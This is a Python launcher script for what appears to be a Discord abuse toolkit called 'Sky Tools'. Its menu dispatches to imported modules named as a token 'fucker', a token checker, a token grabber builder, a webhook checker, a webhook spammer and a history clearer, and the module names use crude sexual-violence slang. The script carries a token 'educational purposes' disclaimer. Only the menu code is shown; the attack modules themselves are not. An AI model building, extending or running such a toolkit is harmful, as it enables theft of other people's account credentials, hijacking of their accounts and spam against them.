from colored import fg, bg, attr
import time
import os

import modules.tokenRape as tokenRape
import modules.historyClear as historyClear
import modules.tokenWebhookChecker as checkers
import modules.webhookSpammer as spammer
import modules.tokenGrabber as grabber
import modules.credits as credits

r = fg(241)
r2 = fg(255)
b = fg(31)
w = fg(15)
y = fg(3) + attr(1)
d = r2 + attr(21)

class Client:
    def __init__(self):
        modules = {
            "1" : {"function" : tokenRape.rape, "name" : "Token Fucker"},
            "2" : {"function" : checkers.token, "name" : "Token Checker"},
            "3" : {"function" : grabber.create_grabber, "name" : "Token Grabber"},
            "4" : {"function" : checkers.webhook, "name" : "Webhook Checker"},
            "5" : {"function" : spammer.spammer, "name" : "Webhook Spammer"},
            "6" : {"function" : historyClear.clear, "name" : "History Clear"},
            "7" : {"function" : credits.show_credits, "name" : "Credits"},
            "8" : {"function" : exit, "name" : "Exit"}
        }
        self.modules = modules

    def main(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""
  ██████   ██ ▄█▀ ▓██   ██▓   ▄▄▄█████▓ ▒█████   ▒█████   ██▓      ██████ 
▒██    ▒   ██▄█▒   ▒██  ██▒   ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    ▒██    ▒ 
░ ▓██▄    ▓███▄░    ▒██ ██░   ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    ░ ▓██▄   
  ▒   ██▒ ▓██ █▄    ░ ▐██▓░   ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░      ▒   ██▒
▒██████▒▒ ▒██▒ █▄   ░ ██▒▓░     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒▒██████▒▒
▒ ▒▓▒ ▒ ░ ▒ ▒▒ ▓▒    ██▒▒▒      ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░▒ ▒▓▒ ▒ ░
░ ░▒  ░ ░ ░ ░▒ ▒░  ▓██ ░▒░        ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░░ ░▒  ░ ░
░  ░  ░   ░ ░░ ░   ▒ ▒ ░░       ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   ░  ░  ░  
      ░   ░  ░     ░ ░                     ░ ░      ░ ░      ░  ░      ░  
                   ░ ░                                        By: Sky#5666""")
        print("""                    
 * DISCLAIMR: This script is made for           *
 * educational purporses and the developers     *
 * assume no liabilaty and are not responsible  *
 * for any misuse or damages caused by the      *
 * script                                       *
""")
        indx = 0
        for key, val in self.modules.items():
            num = f"{r2}[{b}{key}{r2}]"
            print(
                f" {num:<6} {val['name']:<{20 if int(key) < 10 else 19}}",
                end = "" if indx % 2 == 0 else "\n"
            )
            indx += 1


        if indx % 2 == 1:
            print("")

        option = input(f"\n {r2}[{b}?{r2}] Option: ")

        data = self.modules[option]

        data["function"]()

        input(f"\n {r2}[{b}!{r2}] Done! Press enter to continue")
        self.main()

if __name__ == '__main__':
    client = Client()
    client.main()